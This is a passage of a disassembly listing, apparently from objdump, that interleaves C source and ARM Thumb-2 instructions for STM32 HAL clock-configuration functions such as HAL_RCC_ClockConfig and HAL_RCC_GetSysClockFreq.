  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80042e0:	687b      	ldr	r3, [r7, #4]
 80042e2:	681b      	ldr	r3, [r3, #0]
 80042e4:	f003 0302 	and.w	r3, r3, #2
 80042e8:	2b00      	cmp	r3, #0
 80042ea:	d010      	beq.n	800430e <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80042ec:	687b      	ldr	r3, [r7, #4]
 80042ee:	689a      	ldr	r2, [r3, #8]
 80042f0:	4b66      	ldr	r3, [pc, #408]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 80042f2:	689b      	ldr	r3, [r3, #8]
 80042f4:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 80042f8:	429a      	cmp	r2, r3
 80042fa:	d908      	bls.n	800430e <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 80042fc:	4b63      	ldr	r3, [pc, #396]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 80042fe:	689b      	ldr	r3, [r3, #8]
 8004300:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004304:	687b      	ldr	r3, [r7, #4]
 8004306:	689b      	ldr	r3, [r3, #8]
 8004308:	4960      	ldr	r1, [pc, #384]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 800430a:	4313      	orrs	r3, r2
 800430c:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 800430e:	687b      	ldr	r3, [r7, #4]
 8004310:	681b      	ldr	r3, [r3, #0]
 8004312:	f003 0301 	and.w	r3, r3, #1
 8004316:	2b00      	cmp	r3, #0
 8004318:	d04c      	beq.n	80043b4 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 800431a:	687b      	ldr	r3, [r7, #4]
 800431c:	685b      	ldr	r3, [r3, #4]
 800431e:	2b03      	cmp	r3, #3
 8004320:	d107      	bne.n	8004332 <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004322:	4b5a      	ldr	r3, [pc, #360]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004324:	681b      	ldr	r3, [r3, #0]
 8004326:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800432a:	2b00      	cmp	r3, #0
 800432c:	d121      	bne.n	8004372 <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 800432e:	2301      	movs	r3, #1
 8004330:	e0a6      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8004332:	687b      	ldr	r3, [r7, #4]
 8004334:	685b      	ldr	r3, [r3, #4]
 8004336:	2b02      	cmp	r3, #2
 8004338:	d107      	bne.n	800434a <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 800433a:	4b54      	ldr	r3, [pc, #336]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 800433c:	681b      	ldr	r3, [r3, #0]
 800433e:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004342:	2b00      	cmp	r3, #0
 8004344:	d115      	bne.n	8004372 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004346:	2301      	movs	r3, #1
 8004348:	e09a      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 800434a:	687b      	ldr	r3, [r7, #4]
 800434c:	685b      	ldr	r3, [r3, #4]
 800434e:	2b00      	cmp	r3, #0
 8004350:	d107      	bne.n	8004362 <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8004352:	4b4e      	ldr	r3, [pc, #312]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004354:	681b      	ldr	r3, [r3, #0]
 8004356:	f003 0302 	and.w	r3, r3, #2
 800435a:	2b00      	cmp	r3, #0
 800435c:	d109      	bne.n	8004372 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800435e:	2301      	movs	r3, #1
 8004360:	e08e      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8004362:	4b4a      	ldr	r3, [pc, #296]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004364:	681b      	ldr	r3, [r3, #0]
 8004366:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800436a:	2b00      	cmp	r3, #0
 800436c:	d101      	bne.n	8004372 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800436e:	2301      	movs	r3, #1
 8004370:	e086      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 8004372:	4b46      	ldr	r3, [pc, #280]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004374:	689b      	ldr	r3, [r3, #8]
 8004376:	f023 0203 	bic.w	r2, r3, #3
 800437a:	687b      	ldr	r3, [r7, #4]
 800437c:	685b      	ldr	r3, [r3, #4]
 800437e:	4943      	ldr	r1, [pc, #268]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004380:	4313      	orrs	r3, r2
 8004382:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004384:	f7fc fff2 	bl	800136c <HAL_GetTick>
 8004388:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800438a:	e00a      	b.n	80043a2 <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 800438c:	f7fc ffee 	bl	800136c <HAL_GetTick>
 8004390:	4602      	mov	r2, r0
 8004392:	68fb      	ldr	r3, [r7, #12]
 8004394:	1ad3      	subs	r3, r2, r3
 8004396:	f241 3288 	movw	r2, #5000	; 0x1388
 800439a:	4293      	cmp	r3, r2
 800439c:	d901      	bls.n	80043a2 <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 800439e:	2303      	movs	r3, #3
 80043a0:	e06e      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80043a2:	4b3a      	ldr	r3, [pc, #232]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 80043a4:	689b      	ldr	r3, [r3, #8]
 80043a6:	f003 020c 	and.w	r2, r3, #12
 80043aa:	687b      	ldr	r3, [r7, #4]
 80043ac:	685b      	ldr	r3, [r3, #4]
 80043ae:	009b      	lsls	r3, r3, #2
 80043b0:	429a      	cmp	r2, r3
 80043b2:	d1eb      	bne.n	800438c <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80043b4:	687b      	ldr	r3, [r7, #4]
 80043b6:	681b      	ldr	r3, [r3, #0]
 80043b8:	f003 0302 	and.w	r3, r3, #2
 80043bc:	2b00      	cmp	r3, #0
 80043be:	d010      	beq.n	80043e2 <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80043c0:	687b      	ldr	r3, [r7, #4]
 80043c2:	689a      	ldr	r2, [r3, #8]
 80043c4:	4b31      	ldr	r3, [pc, #196]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 80043c6:	689b      	ldr	r3, [r3, #8]
 80043c8:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 80043cc:	429a      	cmp	r2, r3
 80043ce:	d208      	bcs.n	80043e2 <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 80043d0:	4b2e      	ldr	r3, [pc, #184]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 80043d2:	689b      	ldr	r3, [r3, #8]
 80043d4:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80043d8:	687b      	ldr	r3, [r7, #4]
 80043da:	689b      	ldr	r3, [r3, #8]
 80043dc:	492b      	ldr	r1, [pc, #172]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 80043de:	4313      	orrs	r3, r2
 80043e0:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 80043e2:	4b29      	ldr	r3, [pc, #164]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80043e4:	681b      	ldr	r3, [r3, #0]
 80043e6:	f003 0307 	and.w	r3, r3, #7
 80043ea:	683a      	ldr	r2, [r7, #0]
 80043ec:	429a      	cmp	r2, r3
 80043ee:	d210      	bcs.n	8004412 <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80043f0:	4b25      	ldr	r3, [pc, #148]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80043f2:	681b      	ldr	r3, [r3, #0]
 80043f4:	f023 0207 	bic.w	r2, r3, #7
 80043f8:	4923      	ldr	r1, [pc, #140]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80043fa:	683b      	ldr	r3, [r7, #0]
 80043fc:	4313      	orrs	r3, r2
 80043fe:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004400:	4b21      	ldr	r3, [pc, #132]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 8004402:	681b      	ldr	r3, [r3, #0]
 8004404:	f003 0307 	and.w	r3, r3, #7
 8004408:	683a      	ldr	r2, [r7, #0]
 800440a:	429a      	cmp	r2, r3
 800440c:	d001      	beq.n	8004412 <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 800440e:	2301      	movs	r3, #1
 8004410:	e036      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 8004412:	687b      	ldr	r3, [r7, #4]
 8004414:	681b      	ldr	r3, [r3, #0]
 8004416:	f003 0304 	and.w	r3, r3, #4
 800441a:	2b00      	cmp	r3, #0
 800441c:	d008      	beq.n	8004430 <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 800441e:	4b1b      	ldr	r3, [pc, #108]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004420:	689b      	ldr	r3, [r3, #8]
 8004422:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 8004426:	687b      	ldr	r3, [r7, #4]
 8004428:	68db      	ldr	r3, [r3, #12]
 800442a:	4918      	ldr	r1, [pc, #96]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 800442c:	4313      	orrs	r3, r2
 800442e:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 8004430:	687b      	ldr	r3, [r7, #4]
 8004432:	681b      	ldr	r3, [r3, #0]
 8004434:	f003 0308 	and.w	r3, r3, #8
 8004438:	2b00      	cmp	r3, #0
 800443a:	d009      	beq.n	8004450 <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 800443c:	4b13      	ldr	r3, [pc, #76]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 800443e:	689b      	ldr	r3, [r3, #8]
 8004440:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 8004444:	687b      	ldr	r3, [r7, #4]
 8004446:	691b      	ldr	r3, [r3, #16]
 8004448:	00db      	lsls	r3, r3, #3
 800444a:	4910      	ldr	r1, [pc, #64]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 800444c:	4313      	orrs	r3, r2
 800444e:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8004450:	f000 f824 	bl	800449c <HAL_RCC_GetSysClockFreq>
 8004454:	4602      	mov	r2, r0
 8004456:	4b0d      	ldr	r3, [pc, #52]	; (800448c <HAL_RCC_ClockConfig+0x1f0>)
 8004458:	689b      	ldr	r3, [r3, #8]
 800445a:	091b      	lsrs	r3, r3, #4
 800445c:	f003 030f 	and.w	r3, r3, #15
 8004460:	490b      	ldr	r1, [pc, #44]	; (8004490 <HAL_RCC_ClockConfig+0x1f4>)
 8004462:	5ccb      	ldrb	r3, [r1, r3]
 8004464:	f003 031f 	and.w	r3, r3, #31
 8004468:	fa22 f303 	lsr.w	r3, r2, r3
 800446c:	4a09      	ldr	r2, [pc, #36]	; (8004494 <HAL_RCC_ClockConfig+0x1f8>)
 800446e:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 8004470:	4b09      	ldr	r3, [pc, #36]	; (8004498 <HAL_RCC_ClockConfig+0x1fc>)
 8004472:	681b      	ldr	r3, [r3, #0]
 8004474:	4618      	mov	r0, r3
 8004476:	f7fc ff29 	bl	80012cc <HAL_InitTick>
 800447a:	4603      	mov	r3, r0
 800447c:	72fb      	strb	r3, [r7, #11]

  return status;
 800447e:	7afb      	ldrb	r3, [r7, #11]
}
 8004480:	4618      	mov	r0, r3
 8004482:	3710      	adds	r7, #16
 8004484:	46bd      	mov	sp, r7
 8004486:	bd80      	pop	{r7, pc}
 8004488:	40022000 	.word	0x40022000
 800448c:	40021000 	.word	0x40021000
 8004490:	0800d3ec 	.word	0x0800d3ec
 8004494:	20000000 	.word	0x20000000
 8004498:	20000004 	.word	0x20000004

0800449c <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 800449c:	b480      	push	{r7}
 800449e:	b089      	sub	sp, #36	; 0x24
 80044a0:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 80044a2:	2300      	movs	r3, #0
 80044a4:	61fb      	str	r3, [r7, #28]
 80044a6:	2300      	movs	r3, #0
 80044a8:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80044aa:	4b3e      	ldr	r3, [pc, #248]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 80044ac:	689b      	ldr	r3, [r3, #8]
 80044ae:	f003 030c 	and.w	r3, r3, #12
 80044b2:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 80044b4:	4b3b      	ldr	r3, [pc, #236]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 80044b6:	68db      	ldr	r3, [r3, #12]
 80044b8:	f003 0303 	and.w	r3, r3, #3
 80044bc:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80044be:	693b      	ldr	r3, [r7, #16]
 80044c0:	2b00      	cmp	r3, #0
 80044c2:	d005      	beq.n	80044d0 <HAL_RCC_GetSysClockFreq+0x34>
 80044c4:	693b      	ldr	r3, [r7, #16]
 80044c6:	2b0c      	cmp	r3, #12
 80044c8:	d121      	bne.n	800450e <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 80044ca:	68fb      	ldr	r3, [r7, #12]
 80044cc:	2b01      	cmp	r3, #1
 80044ce:	d11e      	bne.n	800450e <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 80044d0:	4b34      	ldr	r3, [pc, #208]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 80044d2:	681b      	ldr	r3, [r3, #0]
 80044d4:	f003 0308 	and.w	r3, r3, #8
 80044d8:	2b00      	cmp	r3, #0
 80044da:	d107      	bne.n	80044ec <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 80044dc:	4b31      	ldr	r3, [pc, #196]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 80044de:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 80044e2:	0a1b      	lsrs	r3, r3, #8
 80044e4:	f003 030f 	and.w	r3, r3, #15
 80044e8:	61fb      	str	r3, [r7, #28]
 80044ea:	e005      	b.n	80044f8 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 80044ec:	4b2d      	ldr	r3, [pc, #180]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 80044ee:	681b      	ldr	r3, [r3, #0]
 80044f0:	091b      	lsrs	r3, r3, #4
 80044f2:	f003 030f 	and.w	r3, r3, #15
 80044f6:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 80044f8:	4a2b      	ldr	r2, [pc, #172]	; (80045a8 <HAL_RCC_GetSysClockFreq+0x10c>)
 80044fa:	69fb      	ldr	r3, [r7, #28]
 80044fc:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004500:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004502:	693b      	ldr	r3, [r7, #16]
 8004504:	2b00      	cmp	r3, #0
 8004506:	d10d      	bne.n	8004524 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 8004508:	69fb      	ldr	r3, [r7, #28]
 800450a:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800450c:	e00a      	b.n	8004524 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 800450e:	693b      	ldr	r3, [r7, #16]
 8004510:	2b04      	cmp	r3, #4
 8004512:	d102      	bne.n	800451a <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 8004514:	4b25      	ldr	r3, [pc, #148]	; (80045ac <HAL_RCC_GetSysClockFreq+0x110>)
 8004516:	61bb      	str	r3, [r7, #24]
 8004518:	e004      	b.n	8004524 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 800451a:	693b      	ldr	r3, [r7, #16]
 800451c:	2b08      	cmp	r3, #8
 800451e:	d101      	bne.n	8004524 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 8004520:	4b23      	ldr	r3, [pc, #140]	; (80045b0 <HAL_RCC_GetSysClockFreq+0x114>)
 8004522:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 8004524:	693b      	ldr	r3, [r7, #16]
 8004526:	2b0c      	cmp	r3, #12
 8004528:	d134      	bne.n	8004594 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 800452a:	4b1e      	ldr	r3, [pc, #120]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 800452c:	68db      	ldr	r3, [r3, #12]
 800452e:	f003 0303 	and.w	r3, r3, #3
 8004532:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 8004534:	68bb      	ldr	r3, [r7, #8]
 8004536:	2b02      	cmp	r3, #2
 8004538:	d003      	beq.n	8004542 <HAL_RCC_GetSysClockFreq+0xa6>
 800453a:	68bb      	ldr	r3, [r7, #8]
 800453c:	2b03      	cmp	r3, #3
 800453e:	d003      	beq.n	8004548 <HAL_RCC_GetSysClockFreq+0xac>
 8004540:	e005      	b.n	800454e <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 8004542:	4b1a      	ldr	r3, [pc, #104]	; (80045ac <HAL_RCC_GetSysClockFreq+0x110>)
 8004544:	617b      	str	r3, [r7, #20]
      break;
 8004546:	e005      	b.n	8004554 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 8004548:	4b19      	ldr	r3, [pc, #100]	; (80045b0 <HAL_RCC_GetSysClockFreq+0x114>)
 800454a:	617b      	str	r3, [r7, #20]
      break;
 800454c:	e002      	b.n	8004554 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 800454e:	69fb      	ldr	r3, [r7, #28]
 8004550:	617b      	str	r3, [r7, #20]
      break;
 8004552:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 8004554:	4b13      	ldr	r3, [pc, #76]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 8004556:	68db      	ldr	r3, [r3, #12]
 8004558:	091b      	lsrs	r3, r3, #4
 800455a:	f003 0307 	and.w	r3, r3, #7
 800455e:	3301      	adds	r3, #1
 8004560:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 8004562:	4b10      	ldr	r3, [pc, #64]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 8004564:	68db      	ldr	r3, [r3, #12]
 8004566:	0a1b      	lsrs	r3, r3, #8
 8004568:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800456c:	697a      	ldr	r2, [r7, #20]
 800456e:	fb03 f202 	mul.w	r2, r3, r2
 8004572:	687b      	ldr	r3, [r7, #4]
 8004574:	fbb2 f3f3 	udiv	r3, r2, r3
 8004578:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 800457a:	4b0a      	ldr	r3, [pc, #40]	; (80045a4 <HAL_RCC_GetSysClockFreq+0x108>)
 800457c:	68db      	ldr	r3, [r3, #12]
 800457e:	0e5b      	lsrs	r3, r3, #25
 8004580:	f003 0303 	and.w	r3, r3, #3
 8004584:	3301      	adds	r3, #1
 8004586:	005b      	lsls	r3, r3, #1
 8004588:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 800458a:	697a      	ldr	r2, [r7, #20]
 800458c:	683b      	ldr	r3, [r7, #0]
 800458e:	fbb2 f3f3 	udiv	r3, r2, r3
 8004592:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 8004594:	69bb      	ldr	r3, [r7, #24]
}
 8004596:	4618      	mov	r0, r3
 8004598:	3724      	adds	r7, #36	; 0x24
 800459a:	46bd      	mov	sp, r7
 800459c:	f85d 7b04 	ldr.w	r7, [sp], #4
 80045a0:	4770      	bx	lr
 80045a2:	bf00      	nop
 80045a4:	40021000 	.word	0x40021000
 80045a8:	0800d404 	.word	0x0800d404
 80045ac:	00f42400 	.word	0x00f42400
 80045b0:	007a1200 	.word	0x007a1200

080045b4 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 80045b4:	b480      	push	{r7}
 80045b6:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 80045b8:	4b03      	ldr	r3, [pc, #12]	; (80045c8 <HAL_RCC_GetHCLKFreq+0x14>)
 80045ba:	681b      	ldr	r3, [r3, #0]
}
 80045bc:	4618      	mov	r0, r3
 80045be:	46bd      	mov	sp, r7
 80045c0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80045c4:	4770      	bx	lr
 80045c6:	bf00      	nop
 80045c8:	20000000 	.word	0x20000000

080045cc <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 80045cc:	b580      	push	{r7, lr}
 80045ce:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 80045d0:	f7ff fff0 	bl	80045b4 <HAL_RCC_GetHCLKFreq>
 80045d4:	4602      	mov	r2, r0
 80045d6:	4b06      	ldr	r3, [pc, #24]	; (80045f0 <HAL_RCC_GetPCLK1Freq+0x24>)
 80045d8:	689b      	ldr	r3, [r3, #8]
 80045da:	0a1b      	lsrs	r3, r3, #8
 80045dc:	f003 0307 	and.w	r3, r3, #7
 80045e0:	4904      	ldr	r1, [pc, #16]	; (80045f4 <HAL_RCC_GetPCLK1Freq+0x28>)
 80045e2:	5ccb      	ldrb	r3, [r1, r3]
 80045e4:	f003 031f 	and.w	r3, r3, #31
 80045e8:	fa22 f303 	lsr.w	r3, r2, r3
}
 80045ec:	4618      	mov	r0, r3
 80045ee:	bd80      	pop	{r7, pc}
 80045f0:	40021000 	.word	0x40021000
 80045f4:	0800d3fc 	.word	0x0800d3fc

080045f8 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 80045f8:	b580      	push	{r7, lr}
 80045fa:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 80045fc:	f7ff ffda 	bl	80045b4 <HAL_RCC_GetHCLKFreq>
 8004600:	4602      	mov	r2, r0
 8004602:	4b06      	ldr	r3, [pc, #24]	; (800461c <HAL_RCC_GetPCLK2Freq+0x24>)
 8004604:	689b      	ldr	r3, [r3, #8]
 8004606:	0adb      	lsrs	r3, r3, #11
 8004608:	f003 0307 	and.w	r3, r3, #7
 800460c:	4904      	ldr	r1, [pc, #16]	; (8004620 <HAL_RCC_GetPCLK2Freq+0x28>)
